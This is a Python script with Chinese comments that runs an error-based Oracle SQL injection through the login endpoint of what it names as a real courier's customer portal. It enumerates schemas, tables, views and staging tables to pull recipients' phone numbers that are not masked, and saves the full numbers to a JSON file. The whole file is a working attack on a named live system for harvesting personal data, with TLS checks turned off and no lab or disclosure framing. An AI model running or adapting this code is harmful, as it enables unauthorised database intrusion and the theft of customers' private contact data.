#!/usr/bin/env python3
"""
寻找真实收件人电话号码
系统化探索所有可能的数据源
"""

import requests
import urllib3
import json

urllib3.disable_warnings()

URL = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def sqli(query):
    """执行SQL注入查询"""
    payload = {
        "Username": f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND 1=CTXSYS.DRITHSX.SN(1,({query})))||'",
        "Password": "test"
    }
    try:
        resp = requests.post(URL, json=payload, verify=False, timeout=30)
        if 'thesaurus' in resp.text:
            start = resp.text.find('thesaurus ') + 10
            end = resp.text.find(' does not', start)
            if end > start:
                result = resp.text[start:end]
                return result if result else None
    except:
        pass
    return None

def search_all_databases():
    """搜索所有142个数据库"""
    print("=" * 70)
    print("🔍 策略1: 搜索所有数据库的订单表")
    print("=" * 70)
    
    # 关键业务数据库
    priority_schemas = [
        'EMS', 'EMSAPI', 'EMSCOM', 'BCCPCOM',
        'CUSTOMER', 'ORDER', 'SHIPPING', 'DELIVERY',
        'LOGISTICS', 'WAREHOUSE', 'DISPATCH'
    ]
    
    # 订单相关表名
    table_names = [
        'ORDERS', 'ORDER_MASTER', 'ORDER_HEADER', 'ORDER_DETAIL',
        'SHIPMENT', 'SHIPPING', 'DELIVERY', 'PARCEL',
        'CONSIGNMENT', 'WAYBILL', 'MANIFEST',
        'CUSTOMER_ORDER', 'SALES_ORDER', 'DISPATCH'
    ]
    
    found = []
    
    for schema in priority_schemas:
        for table in table_names:
            print(f"\n[检查] {schema}.{table}", end=" ... ")
            
            # 检查表是否存在
            exists = sqli(f"SELECT COUNT(*) FROM ALL_TABLES WHERE OWNER='{schema}' AND TABLE_NAME='{table}'")
            
            if exists and exists != '0':
                print(f"✓ 存在", end=" | ")
                
                # 尝试查询电话
                phone = sqli(f"SELECT RECEIVER_PHONE FROM {schema}.{table} WHERE ROWNUM=1")
                
                if phone and 'ORA-' not in str(phone):
                    print(f"PHONE: {phone}")
                    
                    # 检查是否脱敏
                    if 'xxxxx' not in phone:
                        print(f"   🎉 找到完整电话！")
                        found.append({
                            'schema': schema,
                            'table': table,
                            'phone': phone,
                            'type': '完整'
                        })
                    else:
                        found.append({
                            'schema': schema,
                            'table': table,
                            'phone': phone,
                            'type': '脱敏'
                        })
            else:
                print("✗")
    
    return found

def search_by_column_name():
    """通过列名搜索所有包含电话的表"""
    print("\n" + "=" * 70)
    print("🔍 策略2: 搜索所有包含PHONE/MOBILE/TEL的列")
    print("=" * 70)
    
    found = []
    
    # 搜索所有包含电话列的表
    print("\n[搜索] 所有电话列...")
    
    phone_columns = ['PHONE', 'MOBILE', 'TEL', 'TELEPHONE', 'CONTACT']
    
    for col in phone_columns:
        print(f"\n查找包含 {col} 的列:")
        
        for i in range(1, 11):  # 查前10个
            result = sqli(f"""SELECT OWNER||'.'||TABLE_NAME||'.'||COLUMN_NAME 
                FROM (SELECT OWNER, TABLE_NAME, COLUMN_NAME, ROWNUM AS RN 
                FROM ALL_TAB_COLUMNS 
                WHERE COLUMN_NAME LIKE '%{col}%' 
                AND OWNER IN ('EMS','EMSAPI','EMSCOM','BCCPCOM','CUSTOMER','ORDER'))
                WHERE RN={i}""")
            
            if result and 'ORA-' not in str(result):
                print(f"  {i}. {result}")
                
                # 尝试查询数据
                parts = result.split('.')
                if len(parts) == 3:
                    owner, table, column = parts
                    val = sqli(f"SELECT {column} FROM {owner}.{table} WHERE ROWNUM=1")
                    if val and 'xxxxx' not in str(val):
                        print(f"     → {val} ✓")
                        found.append({
                            'location': result,
                            'value': val,
                            'type': '完整'
                        })
    
    return found

def search_views_and_synonyms():
    """搜索视图和同义词"""
    print("\n" + "=" * 70)
    print("🔍 策略3: 搜索视图和同义词")
    print("=" * 70)
    
    found = []
    
    # 搜索订单相关视图
    print("\n[视图] 订单相关视图:")
    for i in range(1, 11):
        view = sqli(f"""SELECT OWNER||'.'||VIEW_NAME 
            FROM (SELECT OWNER, VIEW_NAME, ROWNUM AS RN 
            FROM ALL_VIEWS 
            WHERE VIEW_NAME LIKE '%ORDER%' OR VIEW_NAME LIKE '%SHIP%'
            AND OWNER IN ('EMS','EMSAPI','EMSCOM','BCCPCOM'))
            WHERE RN={i}""")
        
        if view and 'ORA-' not in str(view):
            print(f"  {i}. {view}")
            
            # 尝试查询
            parts = view.split('.')
            if len(parts) == 2:
                owner, view_name = parts
                phone = sqli(f"SELECT RECEIVER_PHONE FROM {owner}.{view_name} WHERE ROWNUM=1")
                if phone and 'xxxxx' not in str(phone):
                    print(f"     → {phone} ✓")
                    found.append({'view': view, 'phone': phone})
    
    return found

def search_import_staging_tables():
    """搜索导入/临时/暂存表"""
    print("\n" + "=" * 70)
    print("🔍 策略4: 搜索导入/临时/暂存表")
    print("=" * 70)
    
    found = []
    
    # 常见的临时表前缀/后缀
    patterns = [
        'TMP%', 'TEMP%', '%_TMP', '%_TEMP',
        'STG%', 'STAGING%', '%_STG', '%_STAGING',
        'IMP%', 'IMPORT%', '%_IMP', '%_IMPORT',
        'BAK%', 'BACKUP%', '%_BAK', '%_BACKUP',
        'RAW%', '%_RAW', 'SRC%', '%_SRC'
    ]
    
    for pattern in patterns:
        print(f"\n[搜索] 模式: {pattern}")
        
        for i in range(1, 6):
            table = sqli(f"""SELECT OWNER||'.'||TABLE_NAME 
                FROM (SELECT OWNER, TABLE_NAME, ROWNUM AS RN 
                FROM ALL_TABLES 
                WHERE TABLE_NAME LIKE '{pattern}'
                AND OWNER IN ('EMS','EMSAPI','EMSCOM','BCCPCOM'))
                WHERE RN={i}""")
            
            if table and 'ORA-' not in str(table):
                print(f"  {i}. {table}")
                
                # 检查是否有PHONE列
                parts = table.split('.')
                if len(parts) == 2:
                    owner, tbl = parts
                    
                    has_phone = sqli(f"SELECT COUNT(*) FROM ALL_TAB_COLUMNS WHERE OWNER='{owner}' AND TABLE_NAME='{tbl}' AND COLUMN_NAME LIKE '%PHONE%'")
                    
                    if has_phone and has_phone != '0':
                        phone = sqli(f"SELECT RECEIVER_PHONE FROM {owner}.{tbl} WHERE ROWNUM=1")
                        if phone and 'xxxxx' not in str(phone):
                            print(f"     → {phone} ✓✓✓")
                            found.append({'table': table, 'phone': phone})
    
    return found

def search_other_schemas():
    """搜索所有142个Schema"""
    print("\n" + "=" * 70)
    print("🔍 策略5: 遍历所有142个Schema")
    print("=" * 70)
    
    found = []
    
    print("\n[枚举] 所有Schema的SHIPMENT/ORDER表...")
    
    # 获取所有schema
    for i in range(1, 143):
        schema = sqli(f"SELECT USERNAME FROM (SELECT USERNAME, ROWNUM AS RN FROM ALL_USERS) WHERE RN={i}")
        
        if schema:
            # 检查关键表
            for table in ['SHIPMENT', 'ORDERS', 'ORDER_MASTER', 'DELIVERY']:
                exists = sqli(f"SELECT COUNT(*) FROM ALL_TABLES WHERE OWNER='{schema}' AND TABLE_NAME='{table}'")
                
                if exists and exists != '0':
                    print(f"  ✓ {schema}.{table}")
                    
                    # 查询电话
                    phone = sqli(f"SELECT RECEIVER_PHONE FROM {schema}.{table} WHERE ROWNUM=1")
                    
                    if phone and 'xxxxx' not in str(phone) and 'ORA-' not in str(phone):
                        print(f"    🎉 完整电话: {phone}")
                        found.append({
                            'schema': schema,
                            'table': table,
                            'phone': phone
                        })
    
    return found

if __name__ == "__main__":
    all_results = []
    
    print("🚀 开始全面搜索真实收件人电话...\n")
    
    # 执行所有策略
    results1 = search_all_databases()
    all_results.extend(results1)
    
    results2 = search_by_column_name()
    all_results.extend(results2)
    
    results3 = search_views_and_synonyms()
    all_results.extend(results3)
    
    results4 = search_import_staging_tables()
    all_results.extend(results4)
    
    # 最后遍历所有schema（耗时较长）
    choice = input("\n是否遍历所有142个Schema? (y/n): ")
    if choice.lower() == 'y':
        results5 = search_other_schemas()
        all_results.extend(results5)
    
    # 输出结果
    print("\n" + "=" * 70)
    print("📊 搜索结果汇总")
    print("=" * 70)
    
    if all_results:
        with open('phone_search_results.json', 'w', encoding='utf-8') as f:
            json.dump(all_results, f, ensure_ascii=False, indent=2)
        
        print(f"\n✓ 找到 {len(all_results)} 个结果")
        print("\n完整电话:")
        for r in all_results:
            if '完整' in str(r.get('type', '')):
                print(f"  {r}")
        
        print(f"\n✓ 结果已保存: phone_search_results.json")
    else:
        print("\n✗ 未找到完整的收件人电话")
        print("  数据库的隐私保护非常严格")
